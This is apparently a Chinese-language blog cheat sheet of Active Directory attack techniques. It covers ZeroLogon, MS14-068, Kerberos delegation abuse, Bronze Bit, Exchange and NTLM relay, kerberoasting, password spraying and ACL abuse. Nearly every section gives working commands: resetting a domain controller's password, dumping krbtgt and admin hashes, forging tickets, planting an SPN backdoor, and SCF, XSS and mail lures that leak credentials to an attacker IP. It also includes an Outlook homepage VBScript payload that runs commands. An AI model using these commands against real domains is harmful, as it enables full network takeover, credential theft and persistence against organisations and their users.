<h4 id="keko利用"><a href="#keko利用" class="headerlink" title="keko利用"></a>keko利用</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">exploit::ms14068 &#x2F;domain:exp.com &#x2F;user:cs &#x2F;password:Aa123123. &#x2F;ptt</span><br></pre></td></tr></table></figure>
<h3 id="CVE-2020-1472"><a href="#CVE-2020-1472" class="headerlink" title="CVE-2020-1472"></a>CVE-2020-1472</h3><p>ZeroLogon通过置空DC机器用户的密码来打DC</p>
<h4 id="python利用"><a href="#python利用" class="headerlink" title="python利用"></a>python利用</h4><p>置空DC机器用户密码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 cve-2020-1472-exploit.py WIN-I8E0L339L6E 10.0.2.254</span><br></pre></td></tr></table></figure>
<p>读取DC的hash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 secretsdump.py exp.com&#x2F;WIN-I8E0L339L6E\$@10.0.2.254 -just-dc -no-pass</span><br></pre></td></tr></table></figure>
<p>PTH，PTK连</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wmiexec.py exp&#x2F;administrator@10.0.2.254 -hashes :b660e61adc0aec1fe34711e6226fcc8c</span><br></pre></td></tr></table></figure>
<h4 id="mimikatz利用"><a href="#mimikatz利用" class="headerlink" title="mimikatz利用"></a>mimikatz利用</h4><p>漏洞检测</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::zerologon &#x2F;target:WIN-I8E0L339L6E.exp.com &#x2F;account:DC$</span><br></pre></td></tr></table></figure>
<p>置空</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::zerologon &#x2F;target:WIN-I8E0L339L6E.exp.com &#x2F;account:WIN-I8E0L339L6E$ &#x2F;exploit</span><br></pre></td></tr></table></figure>
<p>查看票据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;user:krbtgt &#x2F;domain:exp.com</span><br></pre></td></tr></table></figure>
<p>生成黄金票据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsadump::dcsync &#x2F;domain:exp.com &#x2F;dc:WIN-I8E0L339L6E.exp.com &#x2F;user:krbtgt &#x2F;authuser:WIN-I8E0L339L6E$ &#x2F;authdomain:exp &#x2F;authpassword:   &#x2F;authntlm</span><br></pre></td></tr></table></figure>
<p>impacket生成黄金票据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">goldenPac.py test.local&#x2F;jack:123456!@#@WIN-I8E0L339L6E.exp.com</span><br></pre></td></tr></table></figure>
<h4 id="Powershell利用"><a href="#Powershell利用" class="headerlink" title="Powershell利用"></a>Powershell利用</h4><p>Invoke-ZeroLogon.ps1</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">攻击</span><br><span class="line">Invoke-ZeroLogon DC.exp.com</span><br></pre></td></tr></table></figure>
<h4 id="恢复域控密码"><a href="#恢复域控密码" class="headerlink" title="恢复域控密码"></a>恢复域控密码</h4><p>读取DC注册表</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reg save HKLM\SYSTEM system.save</span><br><span class="line">reg save HKLM\SAM sam.save</span><br><span class="line">reg save HKLM\SECURITY security.save</span><br><span class="line">get system.save</span><br><span class="line">get sam.save</span><br><span class="line">get security.save</span><br><span class="line">del &#x2F;f system.save</span><br><span class="line">del &#x2F;f sam.save</span><br><span class="line">del &#x2F;f security.save</span><br></pre></td></tr></table></figure>
<p>读原先机器用户HASH</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secretsdump.py -sam sam.save -system system.save -security security.save LOCAL</span><br></pre></td></tr></table></figure>
<p>还原HASH</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 reinstall_original_pw.py WIN-I8E0L339L6E 10.0.2.254 13adade6efd67a927131a3149a7693c4</span><br><span class="line">exp.com&#x2F;WIN-I8E0L339L6E\$@10.0.2.254 -just-dc -no-pass</span><br></pre></td></tr></table></figure>
<h3 id="Kerberos-Bronze-Bit-Attack"><a href="#Kerberos-Bronze-Bit-Attack" class="headerlink" title="Kerberos Bronze Bit Attack"></a>Kerberos Bronze Bit Attack</h3><h4 id="约束委派绕过"><a href="#约束委派绕过" class="headerlink" title="约束委派绕过"></a>约束委派绕过</h4><p>这里思路是找到非约束委派主机S1，再利用账户向DC请求票据，最后拿着票据攻击S2</p>
<p>1）找到配置了非约束的委派的账户和主机</p>
<p>通过命令查找</p>
<p>2）拿下权限<br>3）尝试Kerberos Bronze Bit Attack</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">runas &#x2F;user:PC\administrator mimikatz</span><br><span class="line">privilege::debug</span><br><span class="line">sekurlsa::ekeys</span><br></pre></td></tr></table></figure>
<p>4）请求票据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 getST.py -spn cifs&#x2F;Service2.test.local -impersonate administrator -hashes AAD3B435B51404EEAAD3B435B51404EE:aa09cecb1728cd5cad6e779c7f370563 -aesKey 71f9caf9203575bbbe760e6a669d90cbe39be0b5a442496295e2f63990ee858f exp.com&#x2F;PC -force-forwardable</span><br></pre></td></tr></table></figure>
<p>5）PTT攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME&#x3D;xx.krb</span><br><span class="line">psexec.py exp.com&#x2F;cs@dc.exp.com -k -no-pass PC.exp.com</span><br></pre></td></tr></table></figure>
<h4 id="资源约束委派绕过"><a href="#资源约束委派绕过" class="headerlink" title="资源约束委派绕过"></a>资源约束委派绕过</h4><p>这里思路是先拿下一个S1，然后利用特权新建一个机器账户，再利用Microsoft.ActiveDirectory.Management.dll添加机器用户与S2的信任关系，再模拟机器用户向DC申请票据，最后通过票据登录S2。</p>
<p>1）首先需要通过powermad新加入一个计算机账户AttackerService，密码为AttackerServicePassword，用域账户jack登录service1。</p>
<p>注：这个powermad工具不仅可以通过滥用特权添加机器账户，还可以添加NS解析记录。NS解析记录可用于HTTP的NTLM RELAY。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Powermad\powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount AttackerService -Password $(ConvertTo-SecureString &#39;AttackerServicePassword&#39; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>
<p>2）然后使用PowerShell Active Directory模块添加基于资源的约束委派，即从AttackerService到Service2的传入信任关系。<br>Microsoft.ActiveDirectory.Management.dll在安装powershell模块Active Directory后生成，默认只在域控上有，可以从域控上导出。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\Microsoft.ActiveDirectory.Management.dll</span><br><span class="line">Get-ADComputer AttackerService #确认机器账户已经被添加</span><br><span class="line">Set-ADComputer Service2 -PrincipalsAllowedToDelegateToAccount AttackerService$</span><br><span class="line">Get-ADComputer Service2 -Properties PrincipalsAllowedToDelegateToAccount</span><br></pre></td></tr></table></figure>
<p>3）设置好基于资源的约束委派之后就可以模拟用户申请票据了。</p>
<p>hashes和aesKey参数来自于添加的机器用户AttackerService，mimikatz可以计算</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::hash &#x2F;password:AttackerServicePassword &#x2F;user:AttackerService</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 getST.py -spn cifs&#x2F;Service2.test.local -impersonate administrator -hashes 830f8df592f48bc036ac79a2bb8036c5:830f8df592f48bc036ac79a2bb8036c5 -aesKey 2a62271bdc6226c1106c1ed8dcb554cbf46fb99dda304c472569218c125d9ffc test.local&#x2F;AttackerService -force-forwardable</span><br></pre></td></tr></table></figure>
<p>4）PTT攻击</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export KRB5CCNAME&#x3D;xx.krb</span><br><span class="line">psexec.py exp.com&#x2F;cs@dc.exp.com -k -no-pass PC.exp.com</span><br></pre></td></tr></table></figure>
<h3 id="MS16-075"><a href="#MS16-075" class="headerlink" title="MS16-075"></a>MS16-075</h3><p>potato系列，通过http协议relay，再反射回给本机的smb协议。用作提权</p>
<h3 id="CVE-2018-8581"><a href="#CVE-2018-8581" class="headerlink" title="CVE-2018-8581"></a>CVE-2018-8581</h3><p>exchange ssrf漏洞</p>
<p>1）使用impacket监听端口进行等待连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntlmrelayx.py -t ldap:&#x2F;&#x2F;10.0.2.254 --no-dump -no-da -escalate-user cs</span><br></pre></td></tr></table></figure>
<p>2）发起推送订阅指定所需的URL，Exchange 服务器将尝试向这个URL发送通知</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privexchange.py -ah 10.0.2.4 owa2010sp3.exp.com -u sqladmin -p 123456 -d exp -ev 2010_SP1</span><br></pre></td></tr></table></figure>
<p>3）relay到域控的ldap服务器会自动给普通用户添加两台ACL</p>
<p>4）dcync</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">secretdump.py exp.com&#x2F;cs:123456@OWA2010SP3.exp.com -dc-ip 10.0.2.253 -just-dc-user administrator</span><br></pre></td></tr></table></figure>
<h3 id="CVE-2019-1040"><a href="#CVE-2019-1040" class="headerlink" title="CVE-2019-1040"></a>CVE-2019-1040</h3><p>smb需要签名的MIC防护绕过</p>
<h4 id="域控打法"><a href="#域控打法" class="headerlink" title="域控打法"></a>域控打法</h4><p>1）域控打法<br>使用impacket监听445进行等待域控进行连接</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntlmrelayx.py -t ldap:&#x2F;&#x2F;1.1.1.1 --escalate-user win7\$ --remove-mic --no-dump -smb2support</span><br></pre></td></tr></table></figure>
<p>使用打印机漏洞让域控连接我们的445(注意攻击的域控跟回连的LDAP所在的服务器不要在同一台域控)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">printerbug.py exp.com&#x2F;cs:123456@10.0.2.4 10.0.2.5</span><br></pre></td></tr></table></figure>
<p>发起win7$到dc2012的s4u，通过-impersonate参数模拟用户administrator的票证</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getST.py exp.com&#x2F;win7\$ -dc-ip 10.0.2.254 -spn cifs&#x2F;dc2012r2.exp.com -hashes xxxx</span><br><span class="line">-impersonate administrator</span><br></pre></td></tr></table></figure>
<p>使用administrator用户的票据登录域控psexec，导入凭证</p>
<p>2）exchange打法</p>
<p>暂无</p>
<h3 id="CVE-2019-1384"><a href="#CVE-2019-1384" class="headerlink" title="CVE-2019-1384"></a>CVE-2019-1384</h3><p>这个是绕过MS08-068，通过超时发送type3</p>
<p><a href="https://shenaniganslabs.io/files/impacket-ghostpotato.zip">https://shenaniganslabs.io/files/impacket-ghostpotato.zip</a></p>
<h2 id="协议缺陷利用"><a href="#协议缺陷利用" class="headerlink" title="协议缺陷利用"></a>协议缺陷利用</h2><h3 id="密码喷洒"><a href="#密码喷洒" class="headerlink" title="密码喷洒"></a>密码喷洒</h3><p>使用DomainPasswordSpray.ps1</p>
<p><a href="https://github.com/dafthack/DomainPasswordSpray">https://github.com/dafthack/DomainPasswordSpray</a></p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell.exe <span class="literal">-exec</span> bypass <span class="built_in">Import-Module</span> DomainPasswordSpray.ps1</span><br><span class="line"><span class="comment">#枚举用户输出成txt</span></span><br><span class="line"><span class="built_in">Get-DomainUserList</span> | <span class="built_in">Out-File</span> <span class="literal">-Encoding</span> ascii userlist.txt</span><br><span class="line"><span class="comment">#喷洒</span></span><br><span class="line"><span class="built_in">Invoke-DomainPasswordSpray</span> <span class="literal">-UserList</span> users.txt <span class="literal">-Domain</span> exp.com <span class="literal">-PasswordList</span> passlist.txt <span class="literal">-OutFile</span> sprayed<span class="literal">-creds</span>.txt</span><br></pre></td></tr></table></figure>
<h3 id="AS-REPRoasting"><a href="#AS-REPRoasting" class="headerlink" title="AS-REPRoasting"></a>AS-REPRoasting</h3><p>如果存在设置了选项不需要kerberos预身份验证的用户，可以直接攻击</p>
<p>查找具有此属性的用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Import-Module .\PowerView.ps1</span><br><span class="line">Get-DomainUser -PreauthNotRequired -Properties distinguishedname -Verbose</span><br></pre></td></tr></table></figure>
<p>发包且监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe asreproast</span><br><span class="line">对于要打非域内的机器通过指定dc的参数即可</span><br><span class="line">Rubeus.exe asreproast &#x2F;dc:xxx</span><br></pre></td></tr></table></figure>
<h3 id="GPP利用"><a href="#GPP利用" class="headerlink" title="GPP利用"></a>GPP利用</h3><p>读取组策略文件</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dir &#x2F;s &#x2F;a \\DC.exp.com\SYSVOL\exp.com\*.xml</span><br><span class="line">powershell  import-modulo  .\Get-GPPpassword.ps1;Get-GppPassword</span><br></pre></td></tr></table></figure>
<h3 id="kerberoasting"><a href="#kerberoasting" class="headerlink" title="kerberoasting"></a>kerberoasting</h3><p>其原理在于先用LDAP查询于域的spn，再通过发送TGS包，提取拼接得到hashcat或者john能爆破的格式。</p>
<p>rubeus攻击直接一键化了。</p>
<p>发包并监听</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rubeus.exe kerberoast</span><br></pre></td></tr></table></figure>
<p>kirbi票据破解</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python tgsrepcrack.py mima.txt 123.kirbi</span><br></pre></td></tr></table></figure>
<p>留后门</p>
<p>给管理员注册一个UNC的服务留后门，随时可以拿读管理员kirbi</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">setspn -U -A UNC&#x2F;dc.exp.com administrator</span><br></pre></td></tr></table></figure>
<h3 id="约束委派攻击"><a href="#约束委派攻击" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h3><p>在adsiedit.msc可以打开ADSI编辑器链接LDAP</p>
<h4 id="非约束委派攻击"><a href="#非约束委派攻击" class="headerlink" title="非约束委派攻击"></a>非约束委派攻击</h4><p>1.找到配置了非约束的委派的机器账户（使用命令）<br>2.拿下权限<br>3.监听来自DC的访问</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Rubeus.exe monitor &#x2F;interval:1 &#x2F;filteruser:dc$</span><br></pre></td></tr></table></figure>
<p>4.得到域控的票据<br>a.打印机漏洞<br>b.其他UNC方式，需要域管交互<br>5.导入base64的ticket</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.\Rubeus.exe ptt &#x2F;ticket:base64</span><br></pre></td></tr></table></figure>
<p>mimikatz导出票据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">privilege::debug</span><br><span class="line">sekurlsa::tickets &#x2F;export</span><br></pre></td></tr></table></figure>
<p>还可通过powershell写成票据文件，可以用rubeus直接导出</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[IO.File]::WriteAllBytes(&quot;ticket.kirbi&quot;, [Convert]::FromBase64String(&quot;Y21kIC9jIG5ldCB1c2VyIGJ5cGFzc3VhYyAxMjM0NTYgL2FkZA&#x3D;&#x3D;&quot;))</span><br></pre></td></tr></table></figure>
<p>PTT</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::ptt 1.kirbi</span><br><span class="line">lsadump::dcsync &#x2F;domain:test.local &#x2F;all &#x2F;csv</span><br></pre></td></tr></table></figure>
<h4 id="约束委派攻击-1"><a href="#约束委派攻击-1" class="headerlink" title="约束委派攻击"></a>约束委派攻击</h4><p>DC上配置委派用户，用来处理其他用户对DC上特定服务的访问请求</p>
<p>DC上配置委派主机，用来处理其他用户对DC上特定服务的访问请求</p>
<p>1.找到配置了非约束的委派的账户和主机</p>
<p>2.拿下权限</p>
<p>3.基于委派服务用户向服务器请求TGT</p>
<p>使用keko冒充委派服务用户请求TGT，密码明文，hash，aes加密都行</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tgt::ask &#x2F;user:cs &#x2F;domain:exp.com &#x2F;password:password</span><br><span class="line">tgt::ask &#x2F;user:cs &#x2F;domain:exp.com &#x2F;NTLM:b4f27a13d0f78d5ad83750095ef2d8ec</span><br></pre></td></tr></table></figure>
<p>4.通过s4u伪造<a href="mailto:&#x61;&#100;&#109;&#105;&#x6e;&#x69;&#x73;&#116;&#114;&#97;&#x74;&#x6f;&#114;&#64;&#x65;&#x78;&#x70;&#x2e;&#99;&#111;&#x6d;&#105;&#x66;&#x73;">&#x61;&#100;&#109;&#105;&#x6e;&#x69;&#x73;&#116;&#114;&#97;&#x74;&#x6f;&#114;&#64;&#x65;&#x78;&#x70;&#x2e;&#99;&#111;&#x6d;&#105;&#x66;&#x73;</a>服务</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tgs::s4u &#x2F;tgt:1.kirbi &#x2F;user:administrator &#x2F;service:cifs&#x2F;dc.test.local</span><br></pre></td></tr></table></figure>
<p>S4U2Self获取到的ST1以及S4U2Proxy获取到的dm08 CIFS服务的ST2会保存在当前目录下</p>
<p>5.PTT</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kerberos::ptt administrator@cifs.kirbi</span><br></pre></td></tr></table></figure>
<h4 id="资源约束委派攻击"><a href="#资源约束委派攻击" class="headerlink" title="资源约束委派攻击"></a>资源约束委派攻击</h4><p>适用2012 R2和Windows Server 2012及以上</p>
<p>暂无</p>
<h3 id="NTML-RELAY攻击"><a href="#NTML-RELAY攻击" class="headerlink" title="NTML RELAY攻击"></a>NTML RELAY攻击</h3><p>NTLM协议是加载在smb、http、ldap等协议上的，relay攻击的过程就是中间人攻击的过程。主要用于域内攻击。</p>
<p>v1版本的NET NTLM拿到相当于拿到hash，使用<a href="https://crack.sh/get-cracking/">这里</a>破解NET NTLMv1不需要RELAY，不过v1版本在win7/server2008之后就不适用了，之后的版本都是v2，v2的攻击方式主要是relay。</p>
<p>v2的破解使用hashcat</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hashcat -m 5600  win10::TEST:1122334455667788:622DED0816CFF5A0652209F20A7CF17A:0101000000000000C0653150DE09D201532C07A7DEE654B8000000000200080053004D004200330001001E00570049004E002D00500052004800340039003200520051004100460056000400140053004D00420033002E006C006F00630061006C0003003400570049004E002D00500052004800340039003200520051004100460056002E0053004D00420033002E006C006F00630061006C000500140053004D00420033002E006C006F00630061006C0007000800C0653150DE09D2010600040002000000080030003000000000000000010000000020000067840C88904F15E659858A3CBA35EBEF61A38EC88C5E3D26B968F1C20C9ACAC10A001000000000000000000000000000000000000900220063006900660073002F003100370032002E00310036002E003100300030002E0031000000000000000000 &#x2F;tmp&#x2F;password.dic --force</span><br></pre></td></tr></table></figure>
<p>以下分三种不同协议的利用方式进行说明。</p>
<p>responder工具发起监听<a href="https://github.com/lgandx/Responder%EF%BC%8C%E4%BD%86%E4%B8%8D%E8%83%BD%E4%B8%AD%E7%BB%A7">https://github.com/lgandx/Responder，但不能中继</a></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">responder -I eth0</span><br></pre></td></tr></table></figure>
<p>impacket下的ntlmrelayx和ldaprelax都可以中继。</p>
<p>接收smb，中继到smb</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntlmrelayx.py -t smb:&#x2F;&#x2F;10.0.2.5 -c whoami -smb2support</span><br></pre></td></tr></table></figure>
<p>接收smb，中继到ldap</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ntlmrelayx.py -t ldap:&#x2F;&#x2F;10.0.2.5 -c whoami -smb2support</span><br></pre></td></tr></table></figure>
<h4 id="RELAY2SMB"><a href="#RELAY2SMB" class="headerlink" title="RELAY2SMB"></a>RELAY2SMB</h4><h5 id="桌面"><a href="#桌面" class="headerlink" title="桌面"></a>桌面</h5><p>修改桌面的desktop.ini的IconResource路径为UNC路径，当在域控上打开桌面文件夹时可成功攻击</p>
<h5 id="SCF文件"><a href="#SCF文件" class="headerlink" title="SCF文件"></a>SCF文件</h5><p>新建scf文件，放到文件夹下，诱导访问这个文件夹</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">[Shell]</span><br><span class="line">Command&#x3D;2</span><br><span class="line">IconFile&#x3D;\\10.0.2.4\scf\test.ico</span><br><span class="line">[Taskbar]</span><br><span class="line">Command&#x3D;ToggleDesktop</span><br></pre></td></tr></table></figure>
<h5 id="用户头像"><a href="#用户头像" class="headerlink" title="用户头像"></a>用户头像</h5><p>win10的情况下，修改用户的头像为UNC地址</p>
<h5 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h5><p>以下是可以携带UNC的命令。都可以命令执行了，还需要relay吗？</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; net.exe use \hostshare </span><br><span class="line">&gt; attrib.exe \hostshare  </span><br><span class="line">&gt; bcdboot.exe \hostshare  </span><br><span class="line">&gt; bdeunlock.exe \hostshare  </span><br><span class="line">&gt; cacls.exe \hostshare  </span><br><span class="line">&gt; certreq.exe \hostshare #(noisy, pops an error dialog) </span><br><span class="line">&gt; certutil.exe \hostshare  </span><br><span class="line">&gt; cipher.exe \hostshare  </span><br><span class="line">&gt; ClipUp.exe -l \hostshare  </span><br><span class="line">&gt; cmdl32.exe \hostshare  </span><br><span class="line">&gt; cmstp.exe &#x2F;s \hostshare  </span><br><span class="line">&gt; colorcpl.exe \hostshare #(noisy, pops an error dialog)  </span><br><span class="line">&gt; comp.exe &#x2F;N&#x3D;0 \hostshare \hostshare  </span><br><span class="line">&gt; compact.exe \hostshare  </span><br><span class="line">&gt; control.exe \hostshare  </span><br><span class="line">&gt; convertvhd.exe -source \hostshare -destination \hostshare </span><br><span class="line">&gt; Defrag.exe \hostshare  </span><br><span class="line">&gt; diskperf.exe \hostshare  </span><br><span class="line">&gt; dispdiag.exe -out \hostshare  </span><br><span class="line">&gt; doskey.exe &#x2F;MACROFILE&#x3D;\hostshare  </span><br><span class="line">&gt; esentutl.exe &#x2F;k \hostshare  </span><br><span class="line">&gt; expand.exe \hostshare  </span><br><span class="line">&gt; extrac32.exe \hostshare  </span><br><span class="line">&gt; FileHistory.exe \hostshare #(noisy, pops a gui)  </span><br><span class="line">&gt; findstr.exe * \hostshare  </span><br><span class="line">&gt; fontview.exe \hostshare #(noisy, pops an error dialog)  </span><br><span class="line">&gt; fvenotify.exe \hostshare #(noisy, pops an access denied error)  </span><br><span class="line">&gt; FXSCOVER.exe \hostshare #(noisy, pops GUI)  </span><br><span class="line">&gt; hwrcomp.exe -check \hostshare  </span><br><span class="line">&gt; hwrreg.exe \hostshare  </span><br><span class="line">&gt; icacls.exe \hostshare   </span><br><span class="line">&gt; licensingdiag.exe -cab \hostshare  </span><br><span class="line">&gt; lodctr.exe \hostshare  </span><br><span class="line">&gt; lpksetup.exe &#x2F;p \hostshare &#x2F;s  </span><br><span class="line">&gt; makecab.exe \hostshare  </span><br><span class="line">&gt; msiexec.exe &#x2F;update \hostshare &#x2F;quiet  </span><br><span class="line">&gt; msinfo32.exe \hostshare #(noisy, pops a &quot;cannot open&quot; dialog)  </span><br><span class="line">&gt; mspaint.exe \hostshare #(noisy, invalid path to png error) </span><br><span class="line">&gt; msra.exe &#x2F;openfile \hostshare #(noisy, error)  </span><br><span class="line">&gt; mstsc.exe \hostshare #(noisy, error)  </span><br><span class="line">&gt; netcfg.exe -l \hostshare -c p -i foo</span><br></pre></td></tr></table></figure>
<h5 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h5><p>适用于IE和EDGE，还可以结合NBNS投毒利用</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script src&#x3D;&quot;\\172.16.100.1\xss&quot;&gt;</span><br></pre></td></tr></table></figure>
<h5 id="邮件"><a href="#邮件" class="headerlink" title="邮件"></a>邮件</h5><p>同XSS</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;img src&#x3D;&quot;\\172.16.100.1\outlook&quot;&gt;</span><br></pre></td></tr></table></figure>
<h5 id="mysql"><a href="#mysql" class="headerlink" title="mysql"></a>mysql</h5><p>需要具备load_file权限，且没有secure_file_priv的限制(5.5.53默认是空，之后的话默认为NULL就不好利用了,不排除一些管理员会改)</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select load_file(&#39;\\\\172.16.100.1\\mysql&#39;);</span><br></pre></td></tr></table></figure>
<h5 id="NBNS和LLMNR"><a href="#NBNS和LLMNR" class="headerlink" title="NBNS和LLMNR"></a>NBNS和LLMNR</h5><p>滥用MachineAccountQuota属性，添加NS解析条目</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Invoke-DNSUpdate -DNSType A -DNSName kali -DNSData 10.0.2.4</span><br></pre></td></tr></table></figure>
<h5 id="XXE-amp-SSRF"><a href="#XXE-amp-SSRF" class="headerlink" title="XXE&amp;SSRF"></a>XXE&amp;SSRF</h5><p>SSRF使用file协议，XXE xml文件使用UNC路径或http协议。</p>
<p>配合NBNS可以直接利用http协议</p>
<h5 id="打印机漏洞"><a href="#打印机漏洞" class="headerlink" title="打印机漏洞"></a>打印机漏洞</h5><p>本地测试printerbug.py的时候，发现开了Print Spooler服务不行，还需要设置一个共享的打印机。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python printerbug.py exp.com&#x2F;cs@10.0.2.5 10.0.2.4</span><br><span class="line">SpoolSample.exe 目标 回连</span><br></pre></td></tr></table></figure>
<h4 id="RELAY2EWS"><a href="#RELAY2EWS" class="headerlink" title="RELAY2EWS"></a>RELAY2EWS</h4><p><a href="https://github.com/Arno0x/NtlmRelayToEWS">https://github.com/Arno0x/NtlmRelayToEWS</a></p>
<p>homepage</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Language&quot; content&#x3D;&quot;en-us&quot;&gt;</span><br><span class="line">&lt;meta http-equiv&#x3D;&quot;Content-Type&quot; content&#x3D;&quot;text&#x2F;html; charset&#x3D;windows-1252&quot;&gt;</span><br><span class="line">&lt;title&gt;Outlook&lt;&#x2F;title&gt;</span><br><span class="line">&lt;script id&#x3D;clientEventHandlersVBS language&#x3D;vbscript&gt;</span><br><span class="line">&lt;!--</span><br><span class="line"> Sub window_onload()</span><br><span class="line">     Set Application &#x3D; ViewCtl1.OutlookApplication</span><br><span class="line">     Set cmd &#x3D; Application.CreateObject(&quot;Wscript.Shell&quot;)</span><br><span class="line">     cmd.Run(&quot;calc&quot;)</span><br><span class="line"> End Sub</span><br><span class="line">--&gt;</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line">&lt;&#x2F;head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line"> &lt;object classid&#x3D;&quot;clsid:0006F063-0000-0000-C000-000000000046&quot; id&#x3D;&quot;ViewCtl1&quot; data&#x3D;&quot;&quot; width&#x3D;&quot;100%&quot; height&#x3D;&quot;100%&quot;&gt;&lt;&#x2F;object&gt;</span><br><span class="line">&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<h4 id="RELAY2LDAP"><a href="#RELAY2LDAP" class="headerlink" title="RELAY2LDAP"></a>RELAY2LDAP</h4><p>高权限用户<br>如果NTLM发起用户在以下用户组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Enterprise admins</span><br><span class="line">Domain admins</span><br><span class="line">Built-in Administrators</span><br><span class="line">Backup operators</span><br><span class="line">Account operators</span><br></pre></td></tr></table></figure>
<p>那么就可以将任意用户拉进该组，从而使该用户称为高权限用户，比如域管</p>
<p>CVE-2019-1040</p>
<h3 id="ACL利用"><a href="#ACL利用" class="headerlink" title="ACL利用"></a>ACL利用</h3><p>这类暂时还不太能理解，怎么组织命令查询有这些权限的呢？</p>
<p>个人感觉这个ACL利用只是对协议利用的原理进行了描述。</p>
<h4 id="member"><a href="#member" class="headerlink" title="member"></a>member</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">bf9679c0-0de6-11d0-a285-00aa003049e2</span><br></pre></td></tr></table></figure>
<p>可以将任意用户，组或计算机添加到目标组<br>将任意用户加入domain admins组</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">adfind -users -rb CN&#x3D;cs -dsq|admod -users -rb CN&#x3D;&quot;Domain Admins&quot; -stdinadd member</span><br></pre></td></tr></table></figure>
<h4 id="servicePrincipalName"><a href="#servicePrincipalName" class="headerlink" title="servicePrincipalName"></a>servicePrincipalName</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">28630EBB-41D5-11D1-A9C1-0000F80367C1</span><br></pre></td></tr></table></figure>
<p>如果对一个对象有写入spn的权限，那么就可以对这个对象进行kerberosting了，如果密码强度不强的话，有机会获取到密码。</p>
<h4 id="GPC-File-Sys-Path"><a href="#GPC-File-Sys-Path" class="headerlink" title="GPC-File-Sys-Path"></a>GPC-File-Sys-Path</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">f30e3bc1-9ff0-11d1-b603-0000f80367c1</span><br></pre></td></tr></table></figure>
<h4 id="User-Force-Change-Password"><a href="#User-Force-Change-Password" class="headerlink" title="User-Force-Change-Password"></a>User-Force-Change-Password</h4><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0299570-246d-11d0-a768-00aa006e0529</span><br></pre></td></tr></table></figure>
<p>可以在不知道当前目标用户的密码的情况下更改目标用户的密码</p>
